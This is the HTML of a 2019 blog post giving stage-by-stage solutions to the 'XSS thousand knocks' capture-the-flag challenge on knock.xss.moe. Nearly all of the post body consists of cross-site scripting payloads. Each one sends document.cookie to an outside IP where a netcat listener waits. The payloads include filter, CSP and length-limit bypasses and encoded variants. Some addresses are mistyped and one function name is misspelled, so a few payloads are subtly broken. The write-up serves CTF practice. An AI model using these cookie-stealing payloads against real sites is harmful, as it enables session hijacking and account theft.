@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XSS-thousands-knocksbefore starting the test, connect to our vps and excute:12nc -lvvkp 1234 l:listen;v:print information;vv:print information in detail;k:keep connecting;p:port stage 1just click the">
+<meta name="keywords" content="CTF WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss-thousand-knocks">
+<meta property="og:url" content="http://yoursite.com/2019/04/22/xss-thousand-knocks/index.html">
+<meta property="og:site_name" content="CH4SER&#39;ZONE">
+<meta property="og:description" content="XSS-thousands-knocksbefore starting the test, connect to our vps and excute:12nc -lvvkp 1234 l:listen;v:print information;vv:print information in detail;k:keep connecting;p:port stage 1just click the">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-04-23T03:28:19.291Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss-thousand-knocks">
+<meta name="twitter:description" content="XSS-thousands-knocksbefore starting the test, connect to our vps and excute:12nc -lvvkp 1234 l:listen;v:print information;vv:print information in detail;k:keep connecting;p:port stage 1just click the">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/22/xss-thousand-knocks/">
+
+
+
+
+
+  <title>xss-thousand-knocks | CH4SER'ZONE</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CH4SER'ZONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">The quieter you become, the more you are able to hear</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/xss-thousand-knocks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ch4ser">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/40637063.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CH4SER'ZONE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xss-thousand-knocks</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-22T04:15:22+00:00">
+                2019-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/题型记录/" itemprop="url" rel="index">
+                    <span itemprop="name">题型记录</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XSS-thousands-knocks"><a href="#XSS-thousands-knocks" class="headerlink" title="XSS-thousands-knocks"></a>XSS-thousands-knocks</h1><p>before starting the test, connect to our vps and excute:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvkp 1234</span><br><span class="line"> l:listen;v:print information;vv:print information in detail;k:keep connecting;p:port</span><br></pre></td></tr></table></figure></p>
+<h2 id="stage-1"><a href="#stage-1" class="headerlink" title="stage 1"></a>stage 1</h2><p>just click the link and get the flag</p>
+<h2 id="stage-2"><a href="#stage-2" class="headerlink" title="stage 2"></a>stage 2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="stage-3"><a href="#stage-3" class="headerlink" title="stage 3"></a>stage 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=&quot;&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="stage-4"><a href="#stage-4" class="headerlink" title="stage 4"></a>stage 4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=&apos;&apos;&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="stage-5"><a href="#stage-5" class="headerlink" title="stage 5"></a>stage 5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=&lt;/textarea&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="stage-6"><a href="#stage-6" class="headerlink" title="stage 6"></a>stage 6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=&lt;/xmp&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="stage-7"><a href="#stage-7" class="headerlink" title="stage 7"></a>stage 7</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=xss&quot;+autofocus+onfocus=&quot;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>
+<h2 id="stage-8"><a href="#stage-8" class="headerlink" title="stage 8"></a>stage 8</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=xss&apos;+autofocus+onfocus=&apos;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>
+<h2 id="stage-9"><a href="#stage-9" class="headerlink" title="stage 9"></a>stage 9</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=xss+autofocus+onfocus=document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>
+<h2 id="stage-10-amp-11"><a href="#stage-10-amp-11" class="headerlink" title="stage 10 &amp; 11"></a>stage 10 &amp; 11</h2><blockquote>
+<p>真协议用来在计算机之间传输数据包，如 http 协议，ftp 协议；伪协议是一种非标准化的协议，让使用者可以通过链接来调用 js 函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=javascript:document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h2 id="stage-12"><a href="#stage-12" class="headerlink" title="stage 12"></a>stage 12</h2><blockquote>
+<p>CSP contains ‘unsafe-inline’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q=javascript:var xss=document.createlement(`link`);xss.setAttribute(`rel`,`prefetch`);xss.setAttribute(`href`,`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`);document.head.appendChild(xss);</span><br><span class="line">//页面渲染完毕会创建 Link REL=prefetch 的标签，向目标页面发起预加载</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h2 id="stage-13"><a href="#stage-13" class="headerlink" title="stage 13"></a>stage 13</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q= &lt;svg onload=eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249YGh0dHA6Ly8yMDcuMTQ4LjY0LjEyNDoxMjM0Lz8ke2RvY3VtZW50LmNvb2tpZX1g&apos;))&gt;</span><br><span class="line">//base64.b64encode(&apos;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&apos;)</span><br></pre></td></tr></table></figure>
+<h2 id="stage-14"><a href="#stage-14" class="headerlink" title="stage 14"></a>stage 14</h2><blockquote>
+<p>CSP:frame-src http://*.knock.xss.moe</p>
+</blockquote>
+<p>using other stage to get the flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">q=http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS%20autofocus%20onfocus=document.domain=`knock.xss.moe`;window.open(`http://207.148.64:1234/?$&#123;parent.document.cookie&#125;`)</span><br><span class="line"></span><br><span class="line">//attention to &apos;domain=`knock.xss.moe`&apos; and &apos;parent.document.cookie&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="stage-15"><a href="#stage-15" class="headerlink" title="stage 15"></a>stage 15</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=&lt;svg onload=document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="stage-16-amp-17"><a href="#stage-16-amp-17" class="headerlink" title="stage 16 &amp; 17"></a>stage 16 &amp; 17</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=javascript:document.location=`http://207.148.64.125:1234/?$&#123;parent.document.cookie&#125;`</span><br></pre></td></tr></table></figure>
+<h2 id="stage-18"><a href="#stage-18" class="headerlink" title="stage 18"></a>stage 18</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q=\%27);window.open(`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`)//</span><br><span class="line">q=\%27);window.open(`http://207.148.64.125:1234/?`%2bdocument.cookie)//</span><br></pre></td></tr></table></figure>
+<h2 id="stage-19"><a href="#stage-19" class="headerlink" title="stage 19"></a>stage 19</h2><blockquote>
+<p>you can eval function in alert()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=xxs&apos;,window.open(`http://207.148.74.125:1234/?$&#123;document.cookie&#125;`));//</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h2 id="stage-20"><a href="#stage-20" class="headerlink" title="stage 20"></a>stage 20</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=&lt;scrscriptipt&gt;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="stage-21"><a href="#stage-21" class="headerlink" title="stage 21"></a>stage 21</h2><blockquote>
+<p>x-xss-protection:1;mode=block;,这里使用了XSS过滤，如果检测到攻击，就会浏览器会阻止页面渲染<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=&lt;sCript&gt;docuscriptment.locscriptation=`http://url/?$&#123;document.cookie&#125;`&lt;/sCript&gt;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h2 id="stage-22"><a href="#stage-22" class="headerlink" title="stage 22"></a>stage 22</h2><blockquote>
+<p>length limit: consider <svg> first,and replace http:// to //,and convert ip to desimalism<br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br/></pre></td><td class="code"><pre><span class="line">q=&lt;svg/onload=window.open(`//url(desimalism)/?$&#123;document.cookie&#125;`)&gt;</span><br/></pre></td></tr></table></figure></svg></p>
+</blockquote>
+<h2 id="stage-23-amp-24"><a href="#stage-23-amp-24" class="headerlink" title="stage 23 &amp; 24"></a>stage 23 &amp; 24</h2><blockquote>
+<p>location.hash:get the anchor point(the content after ‘#’) , which can be used to bypass the length limit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=&lt;svg/onload=eval(location.hash.slice(1))&gt;#window.open(`//url/?$&#123;document.cookie&#125;`)</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h2 id="stage-25"><a href="#stage-25" class="headerlink" title="stage 25"></a>stage 25</h2><p>this is extremely short….<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">the index.php on my vps :</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.name=&quot;location.href=`url/?$&#123;parent.document.cookie&#125;`&quot;;</span><br><span class="line">location.href = &quot;http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/?q=&lt;svg/onload=eval(window.name)&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">and followed by :</span><br><span class="line">http://2017.148.64.125/index.php</span><br></pre></td></tr></table></figure></p>
+<h2 id="stage-26"><a href="#stage-26" class="headerlink" title="stage 26"></a>stage 26</h2><p>会把输入字符全部大写化，原先的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=window.open(`http://134.175.33.164:1234/?$&#123;document.cookie&#125;`)&gt;</span><br></pre></td></tr></table></figure></p>
+<p>将其进行html实体编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6f;&amp;#x70;&amp;#x65;&amp;#x6e;&amp;#x28;&amp;#x60;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x33;&amp;#x34;&amp;#x2e;&amp;#x31;&amp;#x37;&amp;#x35;&amp;#x2e;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x31;&amp;#x36;&amp;#x34;&amp;#x3a;&amp;#x31;&amp;#x32;&amp;#x33;&amp;#x34;&amp;#x2f;&amp;#x3f;&amp;#x24;&amp;#x7b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x7d;&amp;#x60;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>为了防止井号被当作是锚点，将其进行urlencode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src=&quot;x&quot; onerror=%26%23%78%37%37%3b%26%23%78%36%39%3b%26%23%78%36%65%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%37%37%3b%26%23%78%32%65%3b%26%23%78%36%66%3b%26%23%78%37%30%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%32%38%3b%26%23%78%36%30%3b%26%23%78%36%38%3b%26%23%78%37%34%3b%26%23%78%37%34%3b%26%23%78%37%30%3b%26%23%78%33%61%3b%26%23%78%32%66%3b%26%23%78%32%66%3b%26%23%78%33%31%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%37%3b%26%23%78%33%35%3b%26%23%78%32%65%3b%26%23%78%33%33%3b%26%23%78%33%33%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%36%3b%26%23%78%33%34%3b%26%23%78%33%61%3b%26%23%78%33%31%3b%26%23%78%33%32%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%66%3b%26%23%78%33%66%3b%26%23%78%32%34%3b%26%23%78%37%62%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%36%33%3b%26%23%78%37%35%3b%26%23%78%36%64%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%37%34%3b%26%23%78%32%65%3b%26%23%78%36%33%3b%26%23%78%36%66%3b%26%23%78%36%66%3b%26%23%78%36%62%3b%26%23%78%36%39%3b%26%23%78%36%35%3b%26%23%78%37%64%3b%26%23%78%36%30%3b%26%23%78%32%39%3b&gt;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/22/crypto/" rel="next" title="crypto">
+                <i class="fa fa-chevron-left"></i> crypto
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/22/流量分析/" rel="prev" title="流量分析">
+                流量分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/40637063.jpg" alt="ch4ser">
+            
+              <p class="site-author-name" itemprop="name">ch4ser</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ch4ser-go" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/ch4_ser" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-thousands-knocks"><span class="nav-number">1.</span> <span class="nav-text">XSS-thousands-knocks</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-1"><span class="nav-number">1.1.</span> <span class="nav-text">stage 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-2"><span class="nav-number">1.2.</span> <span class="nav-text">stage 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-3"><span class="nav-number">1.3.</span> <span class="nav-text">stage 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-4"><span class="nav-number">1.4.</span> <span class="nav-text">stage 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-5"><span class="nav-number">1.5.</span> <span class="nav-text">stage 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-6"><span class="nav-number">1.6.</span> <span class="nav-text">stage 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-7"><span class="nav-number">1.7.</span> <span class="nav-text">stage 7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-8"><span class="nav-number">1.8.</span> <span class="nav-text">stage 8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-9"><span class="nav-number">1.9.</span> <span class="nav-text">stage 9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-10-amp-11"><span class="nav-number">1.10.</span> <span class="nav-text">stage 10 &amp; 11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-12"><span class="nav-number">1.11.</span> <span class="nav-text">stage 12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-13"><span class="nav-number">1.12.</span> <span class="nav-text">stage 13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-14"><span class="nav-number">1.13.</span> <span class="nav-text">stage 14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-15"><span class="nav-number">1.14.</span> <span class="nav-text">stage 15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-16-amp-17"><span class="nav-number">1.15.</span> <span class="nav-text">stage 16 &amp; 17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-18"><span class="nav-number">1.16.</span> <span class="nav-text">stage 18</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-19"><span class="nav-number">1.17.</span> <span class="nav-text">stage 19</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-20"><span class="nav-number">1.18.</span> <span class="nav-text">stage 20</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-21"><span class="nav-number">1.19.</span> <span class="nav-text">stage 21</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-22"><span class="nav-number">1.20.</span> <span class="nav-text">stage 22</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-23-amp-24"><span class="nav-number">1.21.</span> <span class="nav-text">stage 23 &amp; 24</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-25"><span class="nav-number">1.22.</span> <span class="nav-text">stage 25</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stage-26"><span class="nav-number">1.23.</span> <span class="nav-text">stage 26</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量: <span id="busuanzi_value_site_pv"></span>次
+    </span>
+
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ch4ser</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
